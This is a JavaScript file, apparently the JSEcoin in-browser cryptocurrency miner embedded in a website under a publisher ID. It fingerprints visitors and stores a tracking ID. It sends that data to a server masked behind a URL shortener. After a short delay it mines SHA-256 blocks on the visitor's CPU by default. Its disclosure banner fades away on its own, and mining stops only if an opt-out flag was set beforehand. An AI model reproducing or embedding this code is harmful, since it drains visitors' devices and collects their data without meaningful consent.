function jseTrackAjaxPost(url, req, callback) {
    var lookup = "o=" + encodeURIComponent(req);
    window.XMLHttpRequest ? xmlhttp2 = new XMLHttpRequest : xmlhttp2 = new ActiveXObject("Microsoft.XMLHTTP"), xmlhttp2.onreadystatechange = function() {
        4 == xmlhttp2.readyState && 200 == xmlhttp2.status && callback(xmlhttp2.responseText)
    }, xmlhttp2.open("POST", url, !0), xmlhttp2.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), xmlhttp2.send(lookup)
}

function startNewBlock() {
    lastRequestTime = 0 == lastRequestTime ? 1 : (new Date).getTime(), jseTrackAjaxPost(jseLoadServer + "/request/", "1", function(response) {
        console.log("JSEcoin. New Block Received. Hash rate: " + hps + " hp/s"), currentBlock = JSON.parse(response), jseMine()
    })
}

function fallbackSHA256(s, nonce, callback) {
    function safe_add(x, y) {
        var lsw = (65535 & x) + (65535 & y);
        return (x >> 16) + (y >> 16) + (lsw >> 16) << 16 | 65535 & lsw
    }

    function S(X, n) {
        return X >>> n | X << 32 - n
    }

    function R(X, n) {
        return X >>> n
    }

    function Ch(x, y, z) {
        return x & y ^ ~x & z
    }

    function Maj(x, y, z) {
        return x & y ^ x & z ^ y & z
    }

    function Sigma0256(x) {
        return S(x, 2) ^ S(x, 13) ^ S(x, 22)
    }

    function Sigma1256(x) {
        return S(x, 6) ^ S(x, 11) ^ S(x, 25)
    }

    function Gamma0256(x) {
        return S(x, 7) ^ S(x, 18) ^ R(x, 3)
    }

    function Gamma1256(x) {
        return S(x, 17) ^ S(x, 19) ^ R(x, 10)
    }
    var chrsz = 8,
        hexcase = 0;
    callback(function(binarray) {
        for (var hex_tab = hexcase ? "0123456789ABCDEF" : "0123456789abcdef", str = "", i = 0; i < 4 * binarray.length; i++) str += hex_tab.charAt(binarray[i >> 2] >> 8 * (3 - i % 4) + 4 & 15) + hex_tab.charAt(binarray[i >> 2] >> 8 * (3 - i % 4) & 15);
        return str
    }(function(m, l) {
        var a, b, c, d, e, f, g, h, T1, T2, K = new Array(1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298),
            HASH = new Array(1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225),
            W = new Array(64);
        m[l >> 5] |= 128 << 24 - l % 32, m[15 + (l + 64 >> 9 << 4)] = l;
        for (var i = 0; i < m.length; i += 16) {
            a = HASH[0], b = HASH[1], c = HASH[2], d = HASH[3], e = HASH[4], f = HASH[5], g = HASH[6], h = HASH[7];
            for (var j = 0; j < 64; j++) W[j] = j < 16 ? m[j + i] : safe_add(safe_add(safe_add(Gamma1256(W[j - 2]), W[j - 7]), Gamma0256(W[j - 15])), W[j - 16]), T1 = safe_add(safe_add(safe_add(safe_add(h, Sigma1256(e)), Ch(e, f, g)), K[j]), W[j]), T2 = safe_add(Sigma0256(a), Maj(a, b, c)), h = g, g = f, f = e, e = safe_add(d, T1), d = c, c = b, b = a, a = safe_add(T1, T2);
            HASH[0] = safe_add(a, HASH[0]), HASH[1] = safe_add(b, HASH[1]), HASH[2] = safe_add(c, HASH[2]), HASH[3] = safe_add(d, HASH[3]), HASH[4] = safe_add(e, HASH[4]), HASH[5] = safe_add(f, HASH[5]), HASH[6] = safe_add(g, HASH[6]), HASH[7] = safe_add(h, HASH[7])
        }
        return HASH
    }(function(str) {
        for (var bin = Array(), mask = (1 << chrsz) - 1, i = 0; i < str.length * chrsz; i += chrsz) bin[i >> 5] |= (str.charCodeAt(i / chrsz) & mask) << 24 - i % 32;
        return bin
    }(s = function(string) {
        string = string.replace(/\r\n/g, "\n");
        for (var utftext = "", n = 0; n < string.length; n++) {
            var c = string.charCodeAt(n);
            c < 128 ? utftext += String.fromCharCode(c) : c > 127 && c < 2048 ? (utftext += String.fromCharCode(c >> 6 | 192), utftext += String.fromCharCode(63 & c | 128)) : (utftext += String.fromCharCode(c >> 12 | 224), utftext += String.fromCharCode(c >> 6 & 63 | 128), utftext += String.fromCharCode(63 & c | 128))
        }
        return utftext
    }(s)), s.length * chrsz)) + "," + nonce)
}

function cryptoSha256(str, nonce) {
    var buffer = new TextEncoder("utf-8").encode(str);
    return crypto.subtle.digest("SHA-256", buffer).then(function(hash) {
        return hex(hash) + "," + nonce
    })
}

function hex(buffer) {
    for (var hexCodes = [], view = new DataView(buffer), i = 0; i < view.byteLength; i += 4) {
        var paddedValue = ("00000000" + view.getUint32(i).toString(16)).slice(-"00000000".length);
        hexCodes.push(paddedValue)
    }
    return hexCodes.join("")
}

function processHash(hashNonce, difficulty, jseTrack) {
    if (hashNonce.substr(0, difficulty) === "0".repeat(difficulty)) {
        found = !0;
        var hashSplit = hashNonce.split(","),
            hash = hashSplit[0],
            nonce = hashSplit[1];
        console.log("JSE. Found Hash: " + hash);
        var submission = {};
        submission.blockID = currentBlock.blockID, submission.hash = hash, submission.nonce = nonce.toString(), submission.pubid = jseTrack.pubid, submission.siteid = jseTrack.siteid, submission.subid = jseTrack.subid, submission.uniq = jseTrack.uniq, jseTrackAjaxPost(jseLoadServer + "/submit/", JSON.stringify(submission), function(response) {
            console.log("JSE. Submit Response: " + response)
        })
    }
}

function jseMine() {
    for (var difficulty = currentBlock.difficulty, targetText = JSON.stringify(currentBlock), startNumber = Math.floor(9999999999 * Math.random()), hashingStarted = (new Date).getTime(), x = startNumber; x <= startNumber + hashRate; x++)
        if (targetTextWithNonce = targetText.split("*nonce*").join(x), window.crypto && window.crypto.subtle && window.TextEncoder) cryptoSha256(targetTextWithNonce, x).then(function(hash) {
            processHash(hash, difficulty, jseTrack)
        });
        else fallbackSHA256(targetTextWithNonce, x, function(hash) {
            processHash(hash, difficulty, jseTrack)
        });
    setTimeout(function() {
        var hashingFinished = (new Date).getTime(),
            hashesCompleted = x - startNumber,
            hashingSeconds = (hashingFinished - hashingStarted) / 1e3;
        hps = Math.floor(hashesCompleted / hashingSeconds), (hashRate = 1.1 * hps) < 25 && (hashRate = 25);
        var tmpDate = (new Date).getTime();
        tmpDate > currentBlock.startTime + 2 * currentBlock.frequency + 3e3 && tmpDate > lastRequestTime + 12e3 ? startNewBlock() : jseMine()
    }, 1e3)
}

function jseFadeOut() {
    var fadeTarget = document.getElementById("jseprivacy"),
        fadeEffect = setInterval(function() {
            fadeTarget.style.opacity || (fadeTarget.style.opacity = 1), fadeTarget.style.opacity < .05 ? (fadeTarget.style.display = "none", clearInterval(fadeEffect)) : fadeTarget.style.opacity -= .05
        }, 100)
}

function jseDontShow() {
    jseFadeOut();
    try {
        (new Date).getTime();
        localStorage.setItem("jsedontshow", 1)
    } catch (e) {
        console.log("JSE Error " + e)
    }
}
var jseTrack = {},
    ts = (new Date).getTime(),
    lastRequestTime = 0,
    jseLoadServer = "https://goo.gl/CJUPGr";
if (jseTrack.pubid = "27573", jseTrack.siteid = "cryptonights.jimdo.com", jseTrack.subid = "optionalSubID", jseTrack.userip = "unknownuserip", jseTrack.geo = "unknowngeo", jseTrack.useragent = navigator.userAgent, jseTrack.device = "", jseTrack.browser = "", jseTrack.os = navigator.platform, jseTrack.referrer = document.referrer, jseTrack.useragent.match(/Win|Trident/i) && (jseTrack.device = "Desktop"), jseTrack.useragent.match(/Linux/i) && (jseTrack.device = "Linux"), jseTrack.useragent.match(/Macintosh/i) && (jseTrack.device = "Mac"), jseTrack.useragent.match(/Mobile/i) && (jseTrack.device = "Mobile"), jseTrack.useragent.match(/Tablet|iPad/i) && (jseTrack.device = "Tablet", jseTrack.os = "Tablet"), jseTrack.useragent.match(/iPhone/i) && (jseTrack.device = "iPhone"), jseTrack.useragent.match(/iPad/i) && (jseTrack.device = "iPad"), jseTrack.useragent.match(/MSIE|Trident/i) && (jseTrack.browser = "Internet Explorer"), jseTrack.useragent.match(/Firefox/i) && (jseTrack.browser = "Firefox"), jseTrack.useragent.match(/Chrome/i) && (jseTrack.browser = "Chrome"), jseTrack.useragent.match(/Safari/i) && (jseTrack.browser = "Safari"), jseTrack.useragent.match(/Opera/i) && (jseTrack.browser = "Opera"), jseTrack.useragent.match(/Edge/i) && (jseTrack.browser = "MS Edge"), jseTrack.useragent.match(/Opera/i) && (jseTrack.browser = "Opera"), jseTrack.useragent.match(/UCBrowser/i) && (jseTrack.browser = "UC Browser"), jseTrack.url = window.location.href, jseTrack.language = navigator.language, null == window.frameElement ? jseTrack.iframe = !1 : jseTrack.iframe = !0, localStorage) var jseFirstVisit = Number(localStorage.jseFirstVisit);
if (void 0 !== jseFirstVisit && ts < jseFirstVisit + 864e5) jseTrack.uniq = localStorage.jseTrackuniq, jseTrack.hits = localStorage.jseTrackhits, jseTrack.hits = parseInt(jseTrack.hits) + 1, localStorage.setItem("jseTrackhits", jseTrack.hits), jseHit = {}, jseHit.sendHit = 1, jseHit.pubid = jseTrack.pubid, jseHit.siteid = jseTrack.siteid, jseHit.subid = jseTrack.subid, jseHit.iframe = jseTrack.iframe, jseTrackpostJSON = JSON.stringify(jseHit), jseTrack.hits < 3 && jseTrackAjaxPost(jseLoadServer + "/save/", jseTrackpostJSON, function(response) {});
else {
    jseTrack.firstvisit = ts;
    for (var chars = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"], counter = chars.length, temp, index; counter > 0;) index = Math.floor(Math.random() * counter), temp = chars[--counter], chars[counter] = chars[index], chars[index] = temp;
    jseTrack.uniq = chars.join("").slice(0, 20), jseTrack.hits = 1, localStorage && (localStorage.setItem("jseFirstVisit", String(ts)), localStorage.setItem("jseTrackuniq", jseTrack.uniq), localStorage.setItem("jseTrackhits", jseTrack.hits)), jseTrackpostJSON = JSON.stringify(jseTrack), jseTrackAjaxPost(jseLoadServer + "/save/", jseTrackpostJSON, function(response) {})
}
jseTrackpostJSON = JSON.stringify(jseTrack);
var currentBlock = {},
    hashRate = 500,
    hps = 500;
setTimeout(function() {
    try {
        var jseDateStamp = (new Date).getTime();
        (!Number(localStorage.jsenow) == localStorage.jsenow || !localStorage.jsedontshow && (!localStorage.jsenow || jseDateStamp > Number(localStorage.jsenow) + 36e5)) && (document.body.insertAdjacentHTML("beforeend", '<div id="jseprivacy" style="position: fixed; bottom: 0px; left: 0px; height:50px; width: 100%; z-index:9999; margin: 0px; padding: 0px; color: #FFF; font-style: normal; font-family: Arial, sans-serif; font-size: 10px; line-height: 18px; box-sizing: content-box; vertical-align: middle; text-align: center; background-color:rgba(37, 73, 113, 0.95);"><div style="height: 2px; width: 100%; margin: 0px; background-color:rgba(150, 150, 150, 0.3);"></div><div style="float: right; color: #000; background-color:rgba(150, 150, 150, 0.3); cursor: pointer; padding: 0px 4px; height: 14px; line-height: 14px; font-size: 16px;" onclick="jseFadeOut();">&times;</div><div style="clear: both;"></div><div style="margin: -10px auto 0px auto; display: inline-block; "><div style="float: left; margin: 2px 5px 6px 5px;"><a href="https://platform.jsecoin.com/?lander=1&utm_source=referral&utm_campaign=aff' + jseTrack.pubid + '&utm_content=privacyNotificationLogo" target="_blank"><img src="https://jsecoin.com/img/logowhite.png" style="height: 35px; width: 75px;" /></a></div><div style="float: left; font-size: 9px; font-weight: bold; letter-spacing: 1px;"><a style="color: #04C; margin: 0px 5px; color: #FFF;" href="https://jsecoin.com/?utm_source=referral&utm_campaign=aff' + jseTrack.pubid + '&utm_content=privacyNotificationLearnLink" target="_blank">LEARN MORE</a> <a style="color: #04C; margin: 0px 5px; color: #FFF;" onclick="jseDontShow()" href="javascript:void(0)">DONT SHOW</a></div><div style="float: left; font-size: 9px; font-weight: bold; letter-spacing: 1px;"><a style="color: #04C; margin: 0px 5px; color: #FFF;" href="https://jsecoin.com/privacy/?utm_source=privacyNotification&utm_campaign=privacyOptOut" target="_blank"> PRIVACY &AMP; OPTOUT</a></div><div style="float: left; margin: 0px 5px;"><div style="font-size: 13px; font-weight: bold; letter-spacing: 2px; color: #CCC;">Website Monetized With <a href="https://platform.jsecoin.com/?lander=1&utm_source=referral&utm_campaign=aff' + jseTrack.pubid + '&utm_content=privacyNotificationCryptoLink" target="_blank" style="color: #1AB293; text-decoration: none;">Cryptocurrency Mining</a></div></div><div style="float: left; margin: 0px 5px; font-size: 12px; font-weight: bold;"><div id="jseloading"><img src="https://jsecoin.com/img/whitecogs.gif" style="opacity: 0.7; height: 23px; width: 30px;" /></div></div><div style="clear: both;"></div></div></div>'), setTimeout(function() {
            jseFadeOut()
        }, 15e3), localStorage.setItem("jsenow", jseDateStamp))
    } catch (e) {
        console.log("JSE Error " + e)
    }
}, 7e3), setTimeout(function() {
    try {
        if (localStorage.optout) return !1;
        startNewBlock()
    } catch (e) {
        console.log("JSE Error " + e)
    }
}, 1e4);